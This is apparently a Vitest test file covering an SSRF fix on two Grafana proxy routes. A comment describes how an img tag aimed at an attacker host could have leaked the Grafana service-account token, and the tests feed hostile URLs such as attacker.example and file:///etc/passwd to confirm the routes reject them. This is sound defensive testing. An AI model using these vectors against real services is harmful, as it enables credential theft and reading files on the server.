import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

// ── First API route tests in the repo ────────────────────────────────────────
// All 33 routes were untested. These cover the SSRF fix on the two Grafana
// routes, which are the highest-severity thing found in the audit: both took
// `?url=` verbatim and attached `Authorization: Bearer ${GRAFANA_API_TOKEN}`,
// and both are GET with no CSRF protection — so any page the user visited could
// fire an <img src="…/api/grafana/render?url=http://attacker/"> and read the
// service-account token out of its own access log.
//
// Harness notes, for the next person adding route tests:
//   - App Router handlers are plain `(req: Request) => Response`, so they are
//     directly importable and callable. No Next runtime needed.
//   - Routes hold module-level caches, so vi.resetModules() between tests and
//     import inside the test rather than at the top of the file.
//   - loadConfig() reads data/config.json + process.env; mock it.

const GRAFANA_ORIGIN = "http://192.168.88.196:30037";

function mockConfig() {
  vi.doMock("@/app/lib/server-config", () => ({
    loadConfig: async () => ({ grafana: { baseUrl: GRAFANA_ORIGIN } }),
  }));
}

beforeEach(() => {
  vi.resetModules();
  process.env.GRAFANA_API_TOKEN = "glsa_secret_token_value";
  mockConfig();
});
afterEach(() => {
  vi.unstubAllGlobals();
  delete process.env.GRAFANA_API_TOKEN;
});

async function callRender(url: string) {
  const { GET } = await import("@/app/api/grafana/render/route");
  return GET(new Request(`http://localhost:3000/api/grafana/render?url=${encodeURIComponent(url)}`));
}
async function callTest(url: string) {
  const { GET } = await import("@/app/api/grafana/test/route");
  return GET(new Request(`http://localhost:3000/api/grafana/test?url=${encodeURIComponent(url)}`));
}

describe("/api/grafana/render — origin pinning", () => {
  it("refuses a foreign host and never issues the request", async () => {
    const spy = vi.fn();
    vi.stubGlobal("fetch", spy);

    const res = await callRender("http://attacker.example/d-solo/abc/x");
    expect(res.status).toBe(400);
    // The assertion that matters: the token never left the process.
    expect(spy).not.toHaveBeenCalled();
  });

  it.each([
    ["a different port on the same host", "http://192.168.88.196:9999/d-solo/abc/x"],
    ["a different scheme",                "https://192.168.88.196:30037/d-solo/abc/x"],
    ["a non-http scheme",                 "file:///etc/passwd"],
    ["an unparseable url",                "not-a-url"],
  ])("refuses %s", async (_label, url) => {
    const spy = vi.fn();
    vi.stubGlobal("fetch", spy);
    const res = await callRender(url);
    expect(res.status).toBe(400);
    expect(spy).not.toHaveBeenCalled();
  });

  it("allows the configured Grafana origin and sends the bearer token there", async () => {
    const spy = vi.fn().mockResolvedValue(
      new Response(new Uint8Array([1, 2, 3]), { status: 200, headers: { "content-type": "image/png" } }),
    );
    vi.stubGlobal("fetch", spy);

    const res = await callRender(`${GRAFANA_ORIGIN}/d-solo/abc/node-exporter?panelId=77`);
    expect(res.status).toBe(200);
    expect(spy).toHaveBeenCalledOnce();

    const [calledUrl, init] = spy.mock.calls[0];
    expect(String(calledUrl).startsWith(GRAFANA_ORIGIN)).toBe(true);
    // The path rewrite to /render/d-solo/ is what makes the PNG endpoint work.
    expect(String(calledUrl)).toContain("/render/d-solo/");
    expect((init.headers as Record<string, string>).Authorization).toBe("Bearer glsa_secret_token_value");
  });

  it("400s a missing url without touching the network", async () => {
    const spy = vi.fn();
    vi.stubGlobal("fetch", spy);
    const { GET } = await import("@/app/api/grafana/render/route");
    const res = await GET(new Request("http://localhost:3000/api/grafana/render"));
    expect(res.status).toBe(400);
    expect(spy).not.toHaveBeenCalled();
  });
});

describe("/api/grafana/test — origin pinning", () => {
  // The UID regex in this route was never a security check: http://evil/d/x
  // satisfies /^\/d(-solo)?\/([^/]+)/ trivially, and baseUrl was then rebuilt
  // from the attacker's host with the token attached.
  it("refuses a hostile url that still matches the /d/<uid> shape", async () => {
    const spy = vi.fn();
    vi.stubGlobal("fetch", spy);

    const res = await callTest("http://attacker.example/d/rYdddlPWk/anything");
    expect(res.status).toBe(400);
    expect(spy).not.toHaveBeenCalled();
  });

  it("allows the configured origin", async () => {
    const spy = vi.fn().mockResolvedValue(new Response("{}", { status: 200 }));
    vi.stubGlobal("fetch", spy);

    const res = await callTest(`${GRAFANA_ORIGIN}/d/rYdddlPWk/node-exporter-full`);
    expect(res.status).toBe(200);
    expect(spy).toHaveBeenCalledOnce();
    expect(String(spy.mock.calls[0][0])).toContain("/api/dashboards/uid/rYdddlPWk");
  });
});
